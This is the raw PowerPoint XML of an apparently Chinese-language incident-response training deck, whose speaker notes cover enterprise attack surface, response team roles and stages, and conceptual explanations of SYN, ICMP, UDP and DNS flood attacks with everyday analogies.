        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20330284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itchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="灯片编号占位符 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{2CE63233-8822-418E-A501-61D428B4A849}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>30</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13761668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44</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23860694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72</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33505753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a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1218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　　</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42774104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2734260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1EF0A81-138B-437D-BFD3-D0E87C688A78}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>122</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="141315" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1258888" y="720725"/>
            <a:ext cx="4800600" cy="3600450"/>
          </a:xfrm>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1338320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674B6A7-3AB4-49AD-92ED-3B339AC0C0C4}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>129</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="149507" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1258888" y="720725"/>
            <a:ext cx="4800600" cy="3600450"/>
          </a:xfrm>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6784719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132</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36110392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r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>大型企业业务繁杂，对外暴露的服务特别多，而且有很多违规上线的业务，这就产生了非常多的攻击点。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>并且还有一部分原因是因为业务人员由于安全意识薄弱，也成为了黑客的攻击目标</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>同时，现在大多是黑产团伙，都会每天用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Struts2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>java</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>反序列这类低利用门槛高风险的“秒杀型”漏洞去扫描全网</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>抓肉机，然后植入他们的木马后门。这种抓肉机的方式看起来虽然很蠢，但是却非常高效有用。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2355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33C7DD53-63B9-4552-B2CD-7D4DD0EFA56A}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>137</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2390897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2"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60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4596C04-ABB4-45CF-9296-EF32F0733912}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>138</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11391857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67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0C4147BE-3FCD-4999-823F-3258D035446E}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>140</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9735223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不同公司的应急小组分类可能不同，有可能是身兼数职 也有可能应急响应只是一个人  就是通常所说的一个人的安全部</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3379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372E95A-308E-4055-BB51-F53B49E11620}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>144</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11624185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686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3233DFC-B512-40A0-8218-585A7F8B5E62}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>146</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34247604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可以参考</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1"/>
              <a:t>中央网信办关于印发</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1"/>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1"/>
              <a:t>国家网络安全事件应急预案</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1"/>
              <a:t>》</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1"/>
              <a:t>的通知</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>http://www.cac.gov.cn/2017-06/27/c_1121220113.htm</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US"/>
            </a:br>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3891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332810BC-F496-4096-BF67-2F5F6395B884}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>147</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39592522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98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8F85A9FF-5199-484E-9A79-0B02462565B6}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>149</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28362294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8"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505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DB8D202B-5FF6-4F79-8C84-7FCF4A3B48A8}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>151</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25117292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4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>应该是根除阶段，考试大纲里当时缺少了跟进过程</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4710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95135674-F0E4-4E6B-8CD9-A6049D3D3A01}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>152</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="453615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5F8A0C8D-70FD-4B79-B733-DCB2C38A98F1}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>155</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28826355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0"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b="1"/>
              <a:t>服务器类型、网络拓扑</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" b="1"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>这里了解的信息要尽量详细，为下一步分析收集足够证据；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1741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574C60ED-F909-4976-AE2F-4AB4FED8FC62}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>164</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21652319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8"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5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891C7C6E-4D8B-4C69-904A-407F710DDD95}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>165</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9818056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简单说，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>SYN Flood </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>就是利用 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>TCP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>三次握手，把服务器的“半连接队列”占满</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>正常情况下，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>TCP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>建连是这样：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>客户端发 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>SYN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>服务器回 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>SYN+ACK</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>客户端再回 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>ACK</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>连接建立完成 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>而 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>SYN Flood</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t> 的做法是：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>攻击者不停发大量 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>SYN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t> 请求 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>服务器每收到一个 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SYN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，都会先分配一点资源，并回一个 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>SYN+ACK</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>但攻击者</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>不回最后那个 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>ACK</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，或者用伪造源地址让服务器收不到 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ACK </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>这样服务器上就会留下大量 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>半开连接</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，常见状态就是 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>SYN_RECV / SYN_RECEIVED</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>当这些半连接把队列占满后，正常用户的新连接就进不来了，于是形成拒绝服务 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>可以把它理解成：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>有人不停打电话让前台接起，但从不继续说话，结果电话线都被占住，真正的客户反而打不进来。</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173</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25611826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有人不停拿着假的回执单来窗口办理业务，工作人员每次都得先查系统确认一下，虽然最后发现是假的，但时间和精力已经被耗掉了。</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174</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35907049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ICMP Flood</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t> 简单说，就是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>攻击者向目标连续发送大量 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>ICMP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>报文</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，最常见的是大量 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>Echo Request</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，也就是常说的 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>ping </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>包</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，从而把目标主机或网络链路拖慢甚至打挂。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>有人不停按你家门铃，你每次都要去开门确认一下。门铃按得太多，正常来访的人反而没法被及时接待。</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175</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31140490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UDP Flood</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t> 简单说，就是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>攻击者向目标不断发送大量 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>UDP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>数据包，用数量把主机或链路压垮</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>利用 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>UDP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>无连接、易大量发送的特点，让目标不停收包和处理包，最终被流量和处理开销拖垮。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>有人不停往一个单位门口扔快递，不管里面有没有人签收，门卫都得先看一眼、登记一下、处理一下，东西太多时，真正正常的快递反而进不来了。</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176</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42122327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DNS Flood</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t> 简单说，就是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>攻击者向 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>服务器持续发送海量解析请求，让它忙不过来，导致正常域名解析变慢甚至失败</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>不一定直接打网站本身，而是先把“负责查地址的 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>服务器”打累，让别人找不到网站。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>很多人同时不断给查号台打电话，而且故意问一些很少见、很复杂的号码，查号员一直在查，真正有需要的人反而打不进来。</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177</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15048544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8"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69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CEE67A15-6712-4780-AF5D-E942B6409EDA}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>179</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8271215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74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9259A855-6817-435E-A84A-2639473ABA9B}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
